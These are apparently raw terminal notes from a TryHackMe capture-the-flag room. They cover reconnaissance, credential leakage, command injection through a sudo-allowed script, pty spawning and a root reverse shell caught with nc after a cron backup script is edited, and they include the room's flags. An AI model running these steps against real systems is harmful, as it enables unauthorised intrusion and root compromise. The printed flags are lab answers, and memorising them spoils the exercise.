***port scan***

```
nmap -p- -sC -sV -T4  10.49.128.205   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 18:59 -0400
Nmap scan report for 10.49.128.205
Host is up (0.061s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c4:6e:96:db:08:c4:23:0b:3a:94:0c:80:5f:73:f7:3a (RSA)
|   256 2f:aa:8e:39:80:e3:bf:c5:64:0e:e2:1b:07:3e:4f:b0 (ECDSA)
|_  256 22:c1:fd:34:b9:27:52:ca:85:95:06:8f:ea:35:35:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```
nano /etc/hosts
terget  ip

```


```

gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/common.txt
2026/06/10 19:05:15 wordlist file "/usr/share/wordlists/dirbuster/common.txt" does not exist: stat /usr/share/wordlists/dirbuster/common.txt: no such file or directory
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# locate dirbuster/common.txt                                                      
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# locate  common.txt
/etc/theHarvester/wordlists/general/common.txt
/home/kali/Desktop/tools/SecLists-master/Discovery/File-System/OBEX_common.txt
/home/kali/Desktop/tools/SecLists-master/Discovery/Web-Content/common.txt
/home/kali/Desktop/tools/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt
/home/kali/Desktop/tools/dirsearch/db/categories/common.txt
/usr/share/dirb/wordlists/common.txt
/usr/share/dirb/wordlists/extensions_common.txt
/usr/share/dirb/wordlists/mutations_common.txt
/usr/share/fern-wifi-cracker/extras/wordlists/common.txt
/usr/share/metasploit-framework/data/wordlists/http_owa_common.txt
/usr/share/metasploit-framework/data/wordlists/sap_common.txt
/usr/share/seclists/Discovery/File-System/OBEX_common.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/wfuzz/wordlist/general/common.txt
/usr/share/wfuzz/wordlist/general/extensions_common.txt
/usr/share/wfuzz/wordlist/general/mutations_common.txt
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# gobuster dir -u http://team.thm -w /usr/share/dirb/wordlists/common.txt     

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 273]
.htpasswd            (Status: 403) [Size: 273]
.hta                 (Status: 403) [Size: 273]
assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
index.html           (Status: 200) [Size: 2966]
robots.txt           (Status: 200) [Size: 5]
scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
server-status        (Status: 403) [Size: 273]

```



```

─(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# wfuzz -c -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"                                                                                        
000000049:   200        373 L    977 W      11366 Ch    "server"                                                                                     
000000003:   200        373 L    977 W      11366 Ch    "ftp"                                                                                        
000000015:   200        373 L    977 W      11366 Ch    "ns"                                                                                         
000000031:   200        373 L    977 W      11366 Ch    "mobile"                                                                                     
000000007:   200        373 L    977 W      11366 Ch    "webdisk"                                                                                    
000000046:   200        373 L    977 W      11366 Ch    "img"                                                                                        
000000044:   200        373 L    977 W      11366 Ch    "web"                                                                                        
000000039:   200        373 L    977 W      11366 Ch    "dns2"                                                                                       
000000043:   200        373 L    977 W      11366 Ch    "lists"                                                                                      
000000041:   200        373 L    977 W      11366 Ch    "dns1"                                                                                       
000000040:   200        373 L    977 W      11366 Ch    "ns4"                                                                                        
000000042:   200        373 L    977 W      11366 Ch    "static"                                                                                     
000000045:   200        373 L    977 W      11366 Ch    "www1"                                                                                       
000000038:   200        373 L    977 W      11366 Ch    "demo"                                                                                       
000000037:   200        373 L    977 W      11366 Ch    "shop"                                                                                       
000000030:   200        373 L    977 W      11366 Ch    "new"                                                                                        
000000034:   200        373 L    977 W      11366 Ch    "support"                                                                                    
000000036:   200        373 L    977 W      11366 Ch    "secure"                                                                                     
000000035:   200        373 L    977 W      11366 Ch    "cp"                                                                                         
000000033:   200        373 L    977 W      11366 Ch    "beta"                                                                                       
000000032:   200        373 L    977 W      11366 Ch    "mysql"                                                                                      
000000029:   200        373 L    977 W      11366 Ch    "old"                                                                                        
000000024:   200        373 L    977 W      11366 Ch    "admin"                                                                                      
000000026:   200        373 L    977 W      11366 Ch    "vpn"                                                                                        
000000028:   200        373 L    977 W      11366 Ch    "imap"                                                                                       
000000027:   200        373 L    977 W      11366 Ch    "mx"                                                                                         
000000025:   200        373 L    977 W      11366 Ch    "mail2"                                                                                      
000000023:   200        373 L    977 W      11366 Ch    "forum"                                                                                      
000000018:   200        373 L    977 W      11366 Ch    "blog"                                                                                       
000000022:   200        373 L    977 W      11366 Ch    "pop3"                                                                                       
000000020:   200        373 L    977 W      11366 Ch    "www2"                                                                                       
000000019:   200        9 L      20 W       187 Ch      "dev"                                                                                        
000000021:   200        373 L    977 W      11366 Ch    "ns3"                                                                                        
000000017:   200        373 L    977 W      11366 Ch    "m"                                                                                          
000000014:   200        373 L    977 W      11366 Ch    "autoconfig"                                                                                 
000000009:   200        373 L    977 W      11366 Ch    "cpanel"                                                                                     
000000012:   200        373 L    977 W      11366 Ch    "ns2"                                                                                        
000000010:   200        373 L    977 W      11366 Ch    "whm"                                                                                        
000000016:   200        373 L    977 W      11366 Ch    "test"                                                                                       
000000013:   200        373 L    977 W      11366 Ch    "autodiscover"                                                                               
000000011:   200        373 L    977 W      11366 Ch    "ns1"                                                                                        
000000048:   200        373 L    977 W      11366 Ch    "portal"                                                                                     
000000051:   200        373 L    977 W      11366 Ch    "api"                                                                                        
000000005:   200        373 L    977 W      11366 Ch    "webmail"                                                                                    

```


```
wfuzz -c -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 977
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"                                                                                        
000000019:   200        9 L      20 W       187 Ch      "dev"                                                                                        
000000085:   200        9 L      20 W       187 Ch      "www.dev"                                                                                    

Total time: 0
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 0


```


```
 curl http://team.thm/scripts/script.txt
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in

```




```
ssh -i id_rsa dale@10.49.128.205
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Mon Jan 18 10:51:32 2021
dale@ip-10-49-128-205:~$ ls
user.txt
dale@ip-10-49-128-205:~$ cat user.txt 
THM{6Y0TXHz7c2d}
dale@ip-10-49-128-205:~$ pwd
/home/dale
dale@ip-10-49-128-205:~$ cd ..
dale@ip-10-49-128-205:/home$ cd ..
dale@ip-10-49-128-205:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
dale@ip-10-49-128-205:/$ cd root
-bash: cd: root: Permission denied
dale@ip-10-49-128-205:/$ sudo -l
Matching Defaults entries for dale on ip-10-49-128-205:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-49-128-205:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@ip-10-49-128-205:/$ cat /root/root.txt
cat: /root/root.txt: Permission denied
dale@ip-10-49-128-205:/$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: root
Enter 'date' to timestamp the file: root.txt
The Date is Stats have been backed up
dale@ip-10-49-128-205:/$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"




dale@ip-10-49-128-205:/$ read -p "Enter 'date' to timestamp the file: " error
Enter 'date' to timestamp the file: 
dale@ip-10-49-128-205:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
dale@ip-10-49-128-205:/$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
dale@ip-10-49-128-205:/$ sudo su
[sudo] password for dale: 
Sorry, try again.
[sudo] password for dale: 
Sorry, try again.
[sudo] password for dale: 
sudo: 3 incorrect password attempts
dale@ip-10-49-128-205:/$ find / -group admin -type f 2>/dev/null
/usr/local/bin/main_backup.sh
dale@ip-10-49-128-205:/$ nano /usr/local/bin/main_backup.sh
dale@ip-10-49-128-205:/$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
dale@ip-10-49-128-205:/$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: /bin/bash
Enter 'date' to timestamp the file: /bin/bash
The Date is 

^C
dale@ip-10-49-128-205:/$ /bin/bash
dale@ip-10-49-128-205:/$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
dale@ip-10-49-128-205:/$ whoami
dale
dale@ip-10-49-128-205:/$ cd tmp
dale@ip-10-49-128-205:/tmp$ ls -la
total 52
drwxrwxrwt 13 root root 4096 Jun 11 01:39 .
drwxr-xr-x 23 root root 4096 Jun 10 23:58 ..
drwxrwxrwt  2 root root 4096 Jun 10 23:58 .font-unix
drwxrwxrwt  2 root root 4096 Jun 10 23:58 .ICE-unix
drwx------  3 root root 4096 Jun 10 23:59 snap-private-tmp
drwx------  3 root root 4096 Jun 10 23:58 systemd-private-198ac8cdb41c4c8a9185f8ec434ab145-apache2.service-8oBowh
drwx------  3 root root 4096 Jun 10 23:58 systemd-private-198ac8cdb41c4c8a9185f8ec434ab145-ModemManager.service-gNU2Kg
drwx------  3 root root 4096 Jun 10 23:58 systemd-private-198ac8cdb41c4c8a9185f8ec434ab145-systemd-logind.service-bHu3ig
drwx------  3 root root 4096 Jun 10 23:58 systemd-private-198ac8cdb41c4c8a9185f8ec434ab145-systemd-resolved.service-YAxm9f
drwx------  3 root root 4096 Jun 10 23:58 systemd-private-198ac8cdb41c4c8a9185f8ec434ab145-systemd-timesyncd.service-MmkDKg
drwxrwxrwt  2 root root 4096 Jun 10 23:58 .Test-unix
drwxrwxrwt  2 root root 4096 Jun 10 23:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jun 10 23:58 .XIM-unix
dale@ip-10-49-128-205:/tmp$ cd /opt
dale@ip-10-49-128-205:/opt$ ls -la
total 12
drwxr-xr-x  3 root root  4096 Jan 16  2021 .
drwxr-xr-x 23 root root  4096 Jun 10 23:58 ..
drwxrwx---  2 root admin 4096 Jan 17  2021 admin_stuff
dale@ip-10-49-128-205:/opt$ cd admin_stuff/
bash: cd: admin_stuff/: Permission denied
dale@ip-10-49-128-205:/opt$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
dale@ip-10-49-128-205:/opt$ sudo -l
Matching Defaults entries for dale on ip-10-49-128-205:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-49-128-205:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@ip-10-49-128-205:/opt$ cd home
bash: cd: home: No such file or directory
dale@ip-10-49-128-205:/opt$ cd /home
dale@ip-10-49-128-205:/home$ ls
dale  ftpuser  gyles  ssm-user  ubuntu
dale@ip-10-49-128-205:/home$ cd gyles
dale@ip-10-49-128-205:/home/gyles$ ls -la
total 48
drwxr-xr-x 6 gyles gyles   4096 Jan 17  2021 .
drwxr-xr-x 7 root  root    4096 Jun  1  2025 ..
-rwxr--r-- 1 gyles editors  399 Jan 15  2021 admin_checks
-rw------- 1 gyles gyles   5639 Jan 17  2021 .bash_history
-rw-r--r-- 1 gyles gyles    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 gyles gyles   3771 Apr  4  2018 .bashrc
drwx------ 2 gyles gyles   4096 Jan 15  2021 .cache
drwx------ 3 gyles gyles   4096 Jan 15  2021 .gnupg
drwxrwxr-x 3 gyles gyles   4096 Jan 15  2021 .local
-rw-r--r-- 1 gyles gyles    807 Apr  4  2018 .profile
drwx------ 2 gyles gyles   4096 Jan 15  2021 .ssh
-rw-r--r-- 1 gyles gyles      0 Jan 17  2021 .sudo_as_admin_successful
dale@ip-10-49-128-205:/home/gyles$ cdcat admin_checks 

Command 'cdcat' not found, did you mean:

  command 'ccat' from deb ccrypt (1.11-1)
  command 'chcat' from deb policycoreutils-python-utils (3.0-1build1)

Try: sudo apt install <deb name>

dale@ip-10-49-128-205:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"




dale@ip-10-49-128-205:/home/gyles$ sudo -u gyles admin_checks
[sudo] password for dale: 
dale@ip-10-49-128-205:/home/gyles$ sudo -u gyles admin_checks
[sudo] password for dale: 
dale@ip-10-49-128-205:/home/gyles$ sudo -u gyles ./admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: non
Enter 'date' to timestamp the file: bash
The Date is 
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
python3 -c 'import pty;pty.spawn ("/bin/bash")'
gyles@ip-10-49-128-205:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
gyles@ip-10-49-128-205:~$ ls
admin_checks
gyles@ip-10-49-128-205:~$ cd /opt
gyles@ip-10-49-128-205:/opt$ ls
admin_stuff
gyles@ip-10-49-128-205:/opt$ cd admin_stuff/
gyles@ip-10-49-128-205:/opt/admin_stuff$ ls
script.sh
gyles@ip-10-49-128-205:/opt/admin_stuff$ cat script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
gyles@ip-10-49-128-205:/opt/admin_stuff$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
gyles@ip-10-49-128-205:/opt/admin_stuff$ nano /usr/local/bin/main_backup.sh
gyles@ip-10-49-128-205:/opt/admin_stuff$ ^C

```


```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.128.61] from (UNKNOWN) [10.49.128.205] 33860
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),108(lxd),1004(admin)
# cat /root/root.txt
THM{fhqbznavfonq}
# 

```
